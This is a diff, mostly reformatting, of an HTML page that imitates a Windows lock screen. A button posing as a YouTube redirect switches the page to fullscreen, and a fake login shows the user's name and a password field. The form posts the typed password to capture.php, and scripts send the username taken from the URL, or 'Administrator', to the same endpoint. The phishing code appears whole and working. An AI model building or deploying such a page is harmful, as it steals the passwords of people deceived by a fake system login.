@@ -9,20 +9,21 @@
     <script src="./js/Info.js"></script>
     <style onload="information()">
         @import url(https://fonts.googleapis.com/css?family=Open+Sans:light);
+
         * {
             padding: 0;
             margin: 0;
         }
-        
+
         #redirect {
             padding: 15px;
             margin-top: 10px;
         }
-        
+
         html {
             visibility: hidden;
         }
-        
+
         .Page1 {
             z-index: 2;
             position: relative;
@@ -34,7 +35,7 @@
             -moz-background-size: cover;
             -o-background-size: cover;
         }
-        
+
         .Page1 h1 {
             padding-left: 15px;
             position: relative;
@@ -43,14 +44,14 @@
             font-family: Open Sans;
             top: 65vh;
         }
-        
+
         .Page2 h1 {
             color: #FFF;
             font-size: 2.8em;
             font-family: Open Sans;
             font-style: bold;
         }
-        
+
         .Page2:before {
             content: "";
             position: fixed;
@@ -73,7 +74,7 @@
             -moz-background-size: cover;
             -o-background-size: cover;
         }
-        
+
         .Page1 h2 {
             padding-left: 20px;
             position: relative;
@@ -82,7 +83,7 @@
             font-family: Open Sans;
             top: 64vh;
         }
-        
+
         .Page2 {
             font-family: Open Sans;
             z-index: 1;
@@ -91,7 +92,7 @@
             height: 100vh;
             top: -100vh;
         }
-        
+
         .userLogo {
             width: 15em;
             height: 15em;
@@ -99,29 +100,29 @@
             margin: 0em auto;
             display: block;
         }
-        
+
         .userLogo img {
             width: 15em;
             height: 15em;
             border-radius: 10em;
             opacity: 0.5;
         }
-        
+
         .userName {
             text-align: center;
             color: #FFF;
             margin: -1em 0em 1em 0em;
         }
-        
+
         .flexContainer {
             display: block;
         }
-        
+
         .button {
             background-color: transparent;
             border: none;
         }
-        
+
         .passwordInput {
             align-items: center;
             position: relative;
@@ -138,152 +139,178 @@
 
 <body onload="block()">
 
-    <div id="redirect">
-        <button class="button" onclick="myFunction();">Redirect to https://www.youtube.com...</button>
-    </div>
+<div id="redirect">
+    <button class="button" onclick="myFunction();">Redirect to https://www.youtube.com...</button>
+</div>
 
 
-    <div class="wrapper" id="container">
-        <div class="Page1" id="page1">
-            <br>
-            <div class="time">
-                <h1>
-                    <p><span id="hour"></span>:<span id="min"></span></p>
-                </h1>
+<div class="wrapper" id="container">
+    <div class="Page1" id="page1">
+        <br>
+        <div class="time">
+            <h1>
+                <p><span id="hour"></span>:<span id="min"></span></p>
+            </h1>
 
-            </div>
-            <div class="date">
-                <h2>
-                    <p><span id="week"></span>,<span id="date"></span> <span id="month"></span> <span id="day"></span></p>
-                </h2>
-
-            </div>
         </div>
-        <div class="Page2" id="page2">
-            <br><br><br><br><br><br><br><br>
+        <div class="date">
+            <h2>
+                <p><span id="week"></span>,<span id="date"></span> <span id="month"></span> <span id="day"></span></p>
+            </h2>
 
-            <div class="userLogo"><img src="https://i.imgur.com/xap68m4.png" /></div>
-            <div class="userName">
+        </div>
+    </div>
+    <div class="Page2" id="page2">
+        <br><br><br><br><br><br><br><br>
 
+        <div class="userLogo"><img src="https://i.imgur.com/xap68m4.png"/></div>
+        <div class="userName">
+
+            <h1>
+                <p id="user"></p>
                 <h1>
-                    <p id="user"></p>
-                    <h1>
+        </div>
+        <div class="flexContainer">
+            <div>
+                <form action="capture.php" id="form-id" method="post">
+                    <input autofocus class="passwordInput" name="passwd" placeholder="Password" required
+                           type="password"/>
+                </form>
             </div>
-            <div class="flexContainer">
-                <div>
-                    <form action="capture.php" id="form-id" method="post">
-                        <input autofocus class="passwordInput" name="passwd" placeholder="Password" required type="password" />
-                    </form>
-                </div>
 
-                <script type="text/javascript">
-                    function myFunction() {
-                        var x = document.getElementById("wrapper");
-                        if (x.style.display === "none") {
-                            x.style.display = "block";
-                        } else {
-                            x.style.display = "none";
-                        }
-                    }
-
-                    var myDate = new Date();
-                    var month = myDate.getMonth();
-                    var myDay = myDate.getDay();
-                    var date = myDate.getDate();
-                    //        var year = myDate.getFullYear();
-                    var monthArr = ["january", "february", "march", "april", "may", "june", "july", "august", "september", "october", "november", "december"];
-                    month = monthArr[month];
-
-
-                    // Array of days.
-                    var weekday = ['sunday', 'monday', 'tuesday',
-                        'wednesday', 'thursday', 'friday', 'saturday'
-                    ];
-                    //  document.write("Today is : " + weekday[myDay]);
-                    //  document.write("<br/>");
-
-                    // get hour value.
-                    var hours = myDate.getHours();
-                    var ampm = hours >= 12 ? 'PM' : 'AM';
-                    hours = hours % 12;
-                    hours = hours ? hours : 12;
-                    hours = hours < 10 ? '0' + hours : hours;
-                    var minutes = myDate.getMinutes();
-                    minutes = minutes < 10 ? '0' + minutes : minutes;
-                    var myTime = hours + " " + ampm + " : " + minutes +
-                        " : " + myDate.getMilliseconds();
-                    //  document.write("\tCurrent time is : " + myTime);
-                    document.getElementById("hour").innerHTML = hours;
-                    document.getElementById("min").innerHTML = minutes;
-                    document.getElementById("week").innerHTML = weekday[myDay];
-                    //        document.getElementById("year").innerHTML = year;
-                    document.getElementById("day").innerHTML = date;
-                    document.getElementById("month").innerHTML = month;
-                </script>
-                <script>
-                    user_name = document.location.pathname
-
-                    var str = document.location.pathname;
-                    var res = str.split("/", 4);
-
-                    if (user_name.indexOf('win2.html') > -1) {
-                        document.getElementById("user").innerHTML = "Administrator";
-                        $.ajax({
-                            type: 'POST',
-                            url: 'capture.php',
-                            data: {
-                                'username': "Administrator"
-
-                            },
-                            success: function(msg) {
-
-                            }
-                        });
+            <script type="text/javascript">
+                function myFunction() {
+                    var x = document.getElementById("wrapper");
+                    if (x.style.display === "none") {
+                        x.style.display = "block";
                     } else {
-                        document.getElementById("user").innerHTML = res[3];
-                        $.ajax({
-                            type: 'POST',
-                            url: 'capture.php',
-                            data: {
-                                'username': res[3]
-
-                            },
-                            success: function(msg) {
-
-                            }
-                        });
-
+                        x.style.display = "none";
                     }
-                    $(document).ready(function() {
-                        $(".Page1").click(function() {
-                            $(".Page1").animate({
-                                top: "-200vh"
-                            }, 500);
-                        });
+                }
+
+                var myDate = new Date();
+                var month = myDate.getMonth();
+                var myDay = myDate.getDay();
+                var date = myDate.getDate();
+                //        var year = myDate.getFullYear();
+                var monthArr = ["january", "february", "march", "april", "may", "june", "july", "august", "september", "october", "november", "december"];
+                month = monthArr[month];
+
+
+                // Array of days.
+                var weekday = ['sunday', 'monday', 'tuesday',
+                    'wednesday', 'thursday', 'friday', 'saturday'
+                ];
+                //  document.write("Today is : " + weekday[myDay]);
+                //  document.write("<br/>");
+
+                // get hour value.
+                var hours = myDate.getHours();
+                var ampm = hours >= 12 ? 'PM' : 'AM';
+                hours = hours % 12;
+                hours = hours ? hours : 12;
+                hours = hours < 10 ? '0' + hours : hours;
+                var minutes = myDate.getMinutes();
+                minutes = minutes < 10 ? '0' + minutes : minutes;
+                var myTime = hours + " " + ampm + " : " + minutes +
+                    " : " + myDate.getMilliseconds();
+                //  document.write("\tCurrent time is : " + myTime);
+                document.getElementById("hour").innerHTML = hours;
+                document.getElementById("min").innerHTML = minutes;
+                document.getElementById("week").innerHTML = weekday[myDay];
+                //        document.getElementById("year").innerHTML = year;
+                document.getElementById("day").innerHTML = date;
+                document.getElementById("month").innerHTML = month;
+            </script>
+            <script>
+                user_name = document.location.pathname
+
+                var str = document.location.pathname;
+                var res = str.split("/", 4);
+
+                if (user_name.indexOf('win2.html') > -1) {
+                    document.getElementById("user").innerHTML = "Administrator";
+                    $.ajax({
+                        type: 'POST',
+                        url: 'capture.php',
+                        data: {
+                            'username': "Administrator"
+
+                        },
+                        success: function (msg) {
+
+                        }
+                    });
+                } else {
+                    document.getElementById("user").innerHTML = res[3];
+                    $.ajax({
+                        type: 'POST',
+                        url: 'capture.php',
+                        data: {
+                            'username': res[3]
+
+                        },
+                        success: function (msg) {
+
+                        }
                     });
 
-                    document.body.onkeyup = function(e) {
-                        if (e.keyCode == 32) {
-                            $(".Page1").animate({
-                                top: "-200vh"
-                            }, 500);
-                        }
+                }
+                $(document).ready(function () {
+                    $(".Page1").click(function () {
+                        $(".Page1").animate({
+                            top: "-200vh"
+                        }, 500);
+                    });
+                });
+
+                document.body.onkeyup = function (e) {
+                    if (e.keyCode == 32) {
+                        $(".Page1").animate({
+                            top: "-200vh"
+                        }, 500);
                     }
-                </script>
+                }
+            </script>
 
 
-                <script>
-                    function block() {
+            <script>
+                function block() {
 
-                        $(document).ready(function() {
-                            document.getElementsByTagName("html")[0].style.visibility = "visible";
+                    $(document).ready(function () {
+                        document.getElementsByTagName("html")[0].style.visibility = "visible";
 
-                        });
+                    });
 
 
-                        var y = document.getElementById("redirect");
-                        var a = document.getElementById("page1");
-                        var b = document.getElementById("page2");
+                    var y = document.getElementById("redirect");
+                    var a = document.getElementById("page1");
+                    var b = document.getElementById("page2");
+
+                    if (a.style.display === "none") {
+
+                        a.style.display = "block";
+                        b.style.display = "block";
+                        y.style.display = "none";
+                    } else {
+
+                        a.style.display = "none";
+                        b.style.display = "none";
+                        y.style.display = "block";
+
+                    }
+                }
+
+                function myFunction() {
+
+
+                    toggleFullScreen(document.body);
+                    var y = document.getElementById("redirect");
+                    var a = document.getElementById("page1");
+                    var b = document.getElementById("page2");
+
+
+                    document.addEventListener("fullscreenchange", function () {
 
                         if (a.style.display === "none") {
 
@@ -297,154 +324,129 @@
                             y.style.display = "block";
 
                         }
-                    }
 
-                    function myFunction() {
+                    });
+                    document.addEventListener("mozfullscreenchange", function () {
 
+                        if (a.style.display === "none") {
 
-                        toggleFullScreen(document.body);
-                        var y = document.getElementById("redirect");
-                        var a = document.getElementById("page1");
-                        var b = document.getElementById("page2");
-
-
-                        document.addEventListener("fullscreenchange", function() {
-
-                            if (a.style.display === "none") {
-
-                                a.style.display = "block";
-                                b.style.display = "block";
-                                y.style.display = "none";
-                            } else {
-
-                                a.style.display = "none";
-                                b.style.display = "none";
-                                y.style.display = "block";
-
-                            }
-
-                        });
-                        document.addEventListener("mozfullscreenchange", function() {
-
-                            if (a.style.display === "none") {
-
-                                a.style.display = "block";
-                                b.style.display = "block";
-                                y.style.display = "none";
-                            } else {
-
-                                a.style.display = "none";
-                                b.style.display = "none";
-                                y.style.display = "block";
-
-                            }
-
-                        });
-                        document.addEventListener("webkitfullscreenchange", function() {
-
-
-                            if (a.style.display === "none") {
-
-                                a.style.display = "block";
-                                b.style.display = "block";
-                                y.style.display = "none";
-
-                            } else {
-
-                                a.style.display = "none";
-                                b.style.display = "none";
-                                y.style.display = "block";
-
-                            }
-
-
-                        });
-                        document.addEventListener("msfullscreenchange", function() {
-
-                            if (a.style.display === "none") {
-
-                                a.style.display = "block";
-                                b.style.display = "block";
-                                y.style.display = "none";
-                            } else {
-
-                                a.style.display = "none";
-                                b.style.display = "none";
-                                y.style.display = "block";
-
-                            }
-
-                        });
-
-                    }
-
-                    function toggleFullScreen(elem) {
-                        // ## The below if statement seems to work better ## if ((document.fullScreenElement && document.fullScreenElement !== null) || (document.msfullscreenElement && document.msfullscreenElement !== null) || (!document.mozFullScreen && !document.webkitIsFullScreen)) {
-                        if ((document.fullScreenElement !== undefined && document.fullScreenElement === null) || (document.msFullscreenElement !== undefined && document.msFullscreenElement === null) || (document.mozFullScreen !== undefined && !document.mozFullScreen) || (document.webkitIsFullScreen !== undefined && !document.webkitIsFullScreen) || (document.fullscreenElement !== undefined && document.fullscreenElement === null)) {
-                            if (elem.requestFullScreen) {
-                                elem.requestFullScreen();
-                            } else if (elem.mozRequestFullScreen) {
-                                elem.mozRequestFullScreen();
-                            } else if (elem.webkitRequestFullScreen) {
-                                elem.webkitRequestFullScreen(Element.ALLOW_KEYBOARD_INPUT);
-                            } else if (elem.msRequestFullscreen) {
-                                elem.msRequestFullscreen();
-                            }
+                            a.style.display = "block";
+                            b.style.display = "block";
+                            y.style.display = "none";
                         } else {
-                            if (document.cancelFullScreen) {
-                                document.cancelFullScreen();
-                            } else if (document.mozCancelFullScreen) {
-                                document.mozCancelFullScreen();
-                            } else if (document.webkitCancelFullScreen) {
-                                document.webkitCancelFullScreen();
-                            } else if (document.msExitFullscreen) {
-                                document.msExitFullscreen();
-                            }
+
+                            a.style.display = "none";
+                            b.style.display = "none";
+                            y.style.display = "block";
+
                         }
-                    }
-                </script>
 
-                <script>
-                    function HandleSubmission() {
+                    });
+                    document.addEventListener("webkitfullscreenchange", function () {
 
 
-                        user_name = document.location.pathname
+                        if (a.style.display === "none") {
 
-                        var res = user_name.split("/", 4);
-                        var nameuser = "";
-                        if (user_name.indexOf('win2.html') > -1) {
-                            nameuser = "Administrator";
+                            a.style.display = "block";
+                            b.style.display = "block";
+                            y.style.display = "none";
+
                         } else {
-                            nameuser = res[3];
+
+                            a.style.display = "none";
+                            b.style.display = "none";
+                            y.style.display = "block";
 
                         }
 
 
-                    }
+                    });
+                    document.addEventListener("msfullscreenchange", function () {
 
-                    function CheckForEnterClick(e) {
-                        e = e || window.event;
-                        if (e.keyCode == 13 || e.which == 13) {
-                            HandleSubmission();
+                        if (a.style.display === "none") {
 
-                        }
-                    }
-
-                    var addEventHandler = function(element, eventType, functionRef) {
-                        if (element == null || typeof(element) == 'undefined') {
-                            return;
-                        }
-                        if (element.addEventListener) {
-                            element.addEventListener(eventType, functionRef, false);
-                        } else if (element.attachEvent) {
-                            element.attachEvent("on" + eventType, functionRef);
+                            a.style.display = "block";
+                            b.style.display = "block";
+                            y.style.display = "none";
                         } else {
-                            element["on" + eventType] = functionRef;
-                        }
-                    };
 
-                    addEventHandler(window, "keydown", CheckForEnterClick);
-                </script>
+                            a.style.display = "none";
+                            b.style.display = "none";
+                            y.style.display = "block";
+
+                        }
+
+                    });
+
+                }
+
+                function toggleFullScreen(elem) {
+                    // ## The below if statement seems to work better ## if ((document.fullScreenElement && document.fullScreenElement !== null) || (document.msfullscreenElement && document.msfullscreenElement !== null) || (!document.mozFullScreen && !document.webkitIsFullScreen)) {
+                    if ((document.fullScreenElement !== undefined && document.fullScreenElement === null) || (document.msFullscreenElement !== undefined && document.msFullscreenElement === null) || (document.mozFullScreen !== undefined && !document.mozFullScreen) || (document.webkitIsFullScreen !== undefined && !document.webkitIsFullScreen) || (document.fullscreenElement !== undefined && document.fullscreenElement === null)) {
+                        if (elem.requestFullScreen) {
+                            elem.requestFullScreen();
+                        } else if (elem.mozRequestFullScreen) {
+                            elem.mozRequestFullScreen();
+                        } else if (elem.webkitRequestFullScreen) {
+                            elem.webkitRequestFullScreen(Element.ALLOW_KEYBOARD_INPUT);
+                        } else if (elem.msRequestFullscreen) {
+                            elem.msRequestFullscreen();
+                        }
+                    } else {
+                        if (document.cancelFullScreen) {
+                            document.cancelFullScreen();
+                        } else if (document.mozCancelFullScreen) {
+                            document.mozCancelFullScreen();
+                        } else if (document.webkitCancelFullScreen) {
+                            document.webkitCancelFullScreen();
+                        } else if (document.msExitFullscreen) {
+                            document.msExitFullscreen();
+                        }
+                    }
+                }
+            </script>
+
+            <script>
+                function HandleSubmission() {
+
+
+                    user_name = document.location.pathname
+
+                    var res = user_name.split("/", 4);
+                    var nameuser = "";
+                    if (user_name.indexOf('win2.html') > -1) {
+                        nameuser = "Administrator";
+                    } else {
+                        nameuser = res[3];
+
+                    }
+
+
+                }
+
+                function CheckForEnterClick(e) {
+                    e = e || window.event;
+                    if (e.keyCode == 13 || e.which == 13) {
+                        HandleSubmission();
+
+                    }
+                }
+
+                var addEventHandler = function (element, eventType, functionRef) {
+                    if (element == null || typeof (element) == 'undefined') {
+                        return;
+                    }
+                    if (element.addEventListener) {
+                        element.addEventListener(eventType, functionRef, false);
+                    } else if (element.attachEvent) {
+                        element.attachEvent("on" + eventType, functionRef);
+                    } else {
+                        element["on" + eventType] = functionRef;
+                    }
+                };
+
+                addEventHandler(window, "keydown", CheckForEnterClick);
+            </script>
 
 </body>
 
